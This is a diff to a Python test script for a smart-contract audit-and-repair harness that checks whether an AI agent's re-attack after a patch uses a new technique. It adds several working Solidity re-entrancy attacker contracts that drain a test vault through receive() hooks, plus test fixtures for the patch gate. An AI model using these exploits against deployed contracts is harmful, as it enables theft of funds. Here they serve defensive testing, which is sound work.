@@ -14,6 +14,13 @@ PATCHED contract, as a re-attack's do.
              finals exploit's own selfdestruct, which funds the ATTACKER, is no force-feed)
   static     reworded E_ALL and E_ONE that do not compile, judged from source alone
                                                 -> same / new_entry
+  hook_reach a hook that re-enters through the attacker's own code -- an internal helper,
+             this.attack(), another contract the agent wrote -- names the target function
+             it reaches (it used to name nothing: gate-logic-1)
+  closed     the same re-entrancy re-run on a patch that closes the callback (transfer's
+             2300 gas): helper hook -> same; a hook whose call the source cannot show
+             (selector by keccak256) -> same, from the trace alone. Both were new_class,
+             and check 5 passed on the identical exploit
   finals     the 11/07 finals StakingVault exploit (job 20261107-091855-02ed53, read
              from its results file) vs "re-enter unstake via fallback" on the finals'
              own accepted patch                 -> same (check 5 had said 通過)
@@ -27,7 +34,12 @@ PATCHED contract, as a re-attack's do.
   repair     repair() end to end: a re-attack that only rewords -> check 5 not_diverse,
              patch still accepted, labels in gate.json / PR comment say so; a new
              technique -> pass; a proven re-attack is labelled by its novelty and joins
-             the known attacks the next re-attack is judged against
+             the known attacks the next re-attack is judged against; the helper-hook
+             exploit re-run on the transfer patch -> not_diverse (gate-logic-1); a
+             re-attack whose only exploits never compiled -> "unknown", not_diverse,
+             worded as such (gate-logic-3); a re-attack exploit that PASSED on the patch
+             with no finding submitted -> the patch is rejected, the exploit joins check
+             1 and the next defence (gate-logic-2)
 
     python3 scripts/technique_probe.py [--finals PATH] [--liveness PATH]
 """
@@ -95,6 +107,47 @@ contract Attacker {
     receive() external payable {}
 }
 """)
+# E_ALL with the re-entrant call one step away from receive(): an internal helper, the
+# attacker's own attack(), a helper contract; and one whose call the source cannot show.
+_HOOKED = """
+contract Attacker {{
+    TwoDoorVault public v;
+    uint256 public hits;
+    constructor(address _v) payable {{ v = TwoDoorVault(payable(_v)); }}
+    function attack() external {{ v.deposit{{value: 1 ether}}(); v.withdrawAll(); }}
+{body}
+}}
+"""
+E_HELPER = dict(rp._COMMON, attacker_code=_HOOKED.format(body="""
+    function _again() internal {
+        if (hits < 8 && address(v).balance >= 1 ether) { hits++; v.withdrawAll(); }
+    }
+    receive() external payable { _again(); }"""))
+E_SELF = dict(rp._COMMON, attacker_code=_HOOKED.format(body="""
+    receive() external payable { if (hits < 8) { hits++; this.attack(); } }"""))
+E_VIA = dict(rp._COMMON, attacker_code="""
+contract Again {
+    function go(TwoDoorVault v) external { v.withdrawAll(); }
+}""" + _HOOKED.format(body="""
+    Again public again = new Again();
+    receive() external payable { again.go(v); }"""))
+E_KECCAK = dict(rp._COMMON, attacker_code=_HOOKED.format(body="""
+    receive() external payable {
+        if (hits < 8 && address(v).balance >= 1 ether) {
+            hits++;
+            (bool ok, ) = address(v).call(abi.encodeWithSelector(bytes4(keccak256("withdrawAll()"))));
+            ok;
+        }
+    }"""))
+# A patch that closes the callback rather than the bookkeeping: withdrawAll pays with
+# transfer, whose 2300 gas leaves the hook nothing to re-enter with (lint allows it).
+_XFER_OLD = """        (bool ok, ) = msg.sender.call{value: amount}("");
+        require(ok, "eth transfer failed");
+        balanceOf[msg.sender] = 0;
+"""
+P_XFER = rp.V.replace(_XFER_OLD, "        payable(msg.sender).transfer(amount);\n"
+                                 "        balanceOf[msg.sender] = 0;\n", 1)
+assert P_XFER != rp.V
 
 results: list[tuple[str, bool, str]] = []
 
@@ -135,24 +188,35 @@ def short(fp: dict[str, Any] | None) -> str:
 
 # -- a fake agent.audit that runs scripted exploits through the real harness -------------
 
-def fake_audit(script: list[tuple[dict[str, Any], str]], calls: list[dict[str, Any]]):
-    """Each call takes the next list of (victim_loss spec, hypothesis) and runs them in the
-    re-attack's own workspace, as run_exploit would; proven if one passes."""
+def fake_audit(script: list[list[tuple]], calls: list[dict[str, Any]]):
+    """Each call takes the next list of (victim_loss spec, hypothesis[, opts]) and runs them
+    in the re-attack's own workspace, as run_exploit would; proven if one passes. opts:
+    "replace" [(old, new)] edits the composed file (a PoC that does not compile), and
+    "submit": False leaves a passing exploit without a finding -- the submission refused,
+    the turn budget spent -- as the dispatcher would record it."""
     def audit(gateway: Any, ws: Workspace, *, max_turns: int = 26, ruled_out: Any = None,
               proposals: str = "", **_: Any) -> AgentOutcome:
         calls.append({"max_turns": max_turns, "ruled_out": ruled_out, "proposals": proposals})
         out = AgentOutcome(turns=3, stop_reason="concluded_safe", verdict="safe")
-        for i, (spec, hyp) in enumerate(script.pop(0)):
+        for i, item in enumerate(script.pop(0)):
+            spec, hyp, opts = (tuple(item) + ({},))[:3]
             sol = ws.compose_victim_loss(**spec)
+            for old, new in opts.get("replace", ()):
+                sol = sol.replace(old, new)
             name = ws.write_poc(f"Scripted{len(calls)}x{i}Exploit", sol)
             built = ws.build()
             passed = built.ok and _test_passed(ws.run_poc(name))
             out.pocs.append(PocRecord(name, hyp, sol, built.ok, passed, "", adjudicated=True,
                                       predicate="victim_loss"))
-            if passed:
+            if passed and opts.get("submit", True):
                 out.verdict, out.stop_reason = "vulnerable", "submitted"
                 out.findings.append({"poc_name": name, "title": hyp,
                                      "vulnerable_function": "withdraw"})
+                break
+            if passed:
+                out.verdict, out.stop_reason = "no_verdict", "turn_budget_exhausted"
+                out.rejected_submissions.append({"reason": "offending_expression does not "
+                                                 "appear verbatim", "submission": {"poc_name": name}})
                 break
         return out
     return audit
@@ -196,6 +260,31 @@ def main() -> int:
               and s_all["hook_calls"] == ["withdrawAll"] and s_one["hook_calls"] == ["withdraw"],
               f"reworded {n1} (hooks call {s_all['hook_calls']}); other door {n2} "
               f"(hooks call {s_one['hook_calls']})")
+
+        # gate-logic-1: the hook's re-entrant call one step away, read from source alone.
+        reach = {k: static_fingerprint(Workspace(root, f"h{k}", rp.V).compose_victim_loss(**s),
+                                       rp.V) for k, s in (("helper", E_HELPER), ("self", E_SELF),
+                                                          ("via", E_VIA))}
+        check("hook_reach", reach["helper"]["hook_calls"] == ["withdrawAll"]
+              and reach["self"]["hook_calls"] == ["deposit", "withdrawAll"]
+              and reach["via"]["hook_calls"] == ["withdrawAll"]
+              and all(r["classes"] == ["reentrancy"] for r in reach.values()),
+              "; ".join(f"{k}: hooks call {r['hook_calls']} classes {r['classes']}"
+                        for k, r in reach.items()))
+
+        # The same exploit on a patch that closes the callback: the trace shows no re-entry
+        # (the hook runs out of gas), which read as a new class of attack.
+        out = []
+        for spec in (E_HELPER, E_KECCAK):
+            orig, att = tr.victim(rp.V, spec), tr.victim(P_XFER, spec)
+            out.append((novelty(orig, att), orig, att))
+        (n_h, o_h, a_h), (n_k, o_k, a_k) = out
+        check("closed", n_h == "same" and n_k == "same"
+              and o_h["reentry"] == o_k["reentry"] == ["withdrawAll() -> withdrawAll()"]
+              and not a_h["reentry"] and not a_k["reentry"] and a_k["classes"] == ["callback"]
+              and a_k["hook_calls"] == [] and a_h["hook_calls"] == ["withdrawAll"],
+              f"helper hook {n_h} (on P_XFER {short(a_h)}, hooks call {a_h['hook_calls']}); "
+              f"keccak hook {n_k} (on P_XFER {short(a_k)}, callbacks {a_k['callbacks']})")
 
         # The finals: the recorded exploit on the original, a fallback variant on the patch
         # the finals accepted (both read from runs/, never written).
@@ -291,20 +380,34 @@ def main() -> int:
               f"{[x['novelty'] for x in ra['attempts']]}")
 
         # repair() end to end, the original exploit composed by the harness.
-        rexploit = {**exploit, "solidity": Workspace(root, "c1", rp.V).compose_victim_loss(
-            **rp.E_ALL_SPEC)}
+        broken = {"replace": [("hits++;", "hits+++;")]}
         cases = [
-            ("not_diverse", [rp.P_BOTH], [[(E_ALL_REWORDED, "re-enter withdrawAll via fallback")],
-                                          [(E_ALL_REWORDED, "re-enter withdrawAll again")]]),
-            ("pass", [rp.P_BOTH], [[(rp.E_ONE_SPEC, "re-enter withdraw(amount)")]]),
-            ("proven", [rp.P_ALL, rp.P_BOTH], [[(rp.E_ONE_SPEC, "re-enter withdraw(amount)")],
-                                               [(rp.E_ONE_SPEC, "withdraw(amount) once more")],
-                                               [(rp.E_ONE_SPEC, "withdraw(amount) yet again")]]),
+            ("not_diverse", rp.E_ALL_SPEC, [rp.P_BOTH],
+             [[(E_ALL_REWORDED, "re-enter withdrawAll via fallback")],
+              [(E_ALL_REWORDED, "re-enter withdrawAll again")]]),
+            ("pass", rp.E_ALL_SPEC, [rp.P_BOTH], [[(rp.E_ONE_SPEC, "re-enter withdraw(amount)")]]),
+            ("proven", rp.E_ALL_SPEC, [rp.P_ALL, rp.P_BOTH],
+             [[(rp.E_ONE_SPEC, "re-enter withdraw(amount)")],
+              [(rp.E_ONE_SPEC, "withdraw(amount) once more")],
+              [(rp.E_ONE_SPEC, "withdraw(amount) yet again")]]),
+            # gate-logic-1: the identical helper-hook exploit, re-run on the transfer patch
+            ("helper_hook", E_HELPER, [P_XFER], [[(E_HELPER, "re-enter withdrawAll again")],
+                                                 [(E_HELPER, "re-enter withdrawAll once more")]]),
+            # gate-logic-3: the re-attack's only exploits never compile
+            ("uncompiled", rp.E_ALL_SPEC, [rp.P_BOTH],
+             [[(rp.E_ONE_SPEC, "re-enter withdraw(amount)", broken)],
+              [(rp.E_ONE_SPEC, "withdraw(amount) once more", broken)]]),
+            # gate-logic-2: E_ONE passes on P_ALL, and no finding is ever accepted
+            ("unsubmitted", rp.E_ALL_SPEC, [rp.P_ALL, rp.P_BOTH],
+             [[(rp.E_ONE_SPEC, "re-enter withdraw(amount)", {"submit": False})],
+              [(FORCE_FEED, "force ether in with selfdestruct")]]),
         ]
-        for name, patches, script in cases:
+        for name, spec, patches, script in cases:
             calls = []
             agent_mod.audit = fake_audit(script, calls)
             gw = rp.FakeGateway(patches)
+            rexploit = {**exploit, "solidity": Workspace(root, f"c_{name}", rp.V)
+                        .compose_victim_loss(**spec)}
             rec = patch_mod.repair(gw, rexploit, root=root / f"rep_{name}", rounds=1,
                                    reattack_turns=16)
             view = gate._timeline(rec, 16)
@@ -322,6 +425,31 @@ def main() -> int:
             elif name == "pass":
                 ok = (rec["status"] == "accepted" and c5 == "pass" and view["reattack"]["novel"]
                       and labels[-1].startswith("換手法攻擊：未成功") and len(calls) == 1)
+            elif name == "helper_hook":
+                ok = (rec["status"] == "accepted" and c5 == "not_diverse"
+                      and [x["novelty"] for x in view["reattack"]["attempts"]] == ["same", "same"]
+                      and "沒有換手法" in view["reattack"]["label"] and len(calls) == 2)
+            elif name == "uncompiled":
+                att = view["reattack"]["attempts"]
+                ok = (rec["status"] == "accepted" and c5 == "not_diverse"
+                      and view["reattack"]["novel"] is False
+                      and [(x["compiled"], x["novelty"]) for x in att] == [(False, "unknown")] * 2
+                      and "沒有編譯成功" in view["reattack"]["label"]
+                      and "沒有能執行的新手法攻擊" in labels[-1] and "什麼都沒有測到" in md
+                      and "0 個是新手法" in md and len(calls) == 2
+                      and "did not compile, so it tested nothing" in calls[1]["proposals"])
+            elif name == "unsubmitted":
+                ra2 = rec["reattacks"][0]
+                fed = [str(m.get("content")) for m in gw.seen[-1]]
+                ok = (rec["status"] == "accepted" and ra2["status"] == "proven"
+                      and ra2["finding_submitted"] is False and len(gw.seen) == 2
+                      and "AI 沒有提交發現" in labels[2]
+                      and rec["timeline"][2]["finding_submitted"] is False
+                      and any("PATCH REJECTED: 5" in c for c in fed)
+                      and not any("vulnerable function: None" in c for c in fed)
+                      and [x["poc_name"] for x in rec["extra_exploits"]] == ["Scripted1x0ExploitPoc"]
+                      and rec["checks"]["1"]["extra"][0]["status"] == "pass"
+                      and c5 == "pass" and len(calls) == 2)
             else:
                 # A1 proven -> D1 P_ALL -> A2 proves E_ONE (a new door) -> D2 P_BOTH -> A3
                 # reruns E_ONE, which is now a KNOWN attack: same, so not_diverse.
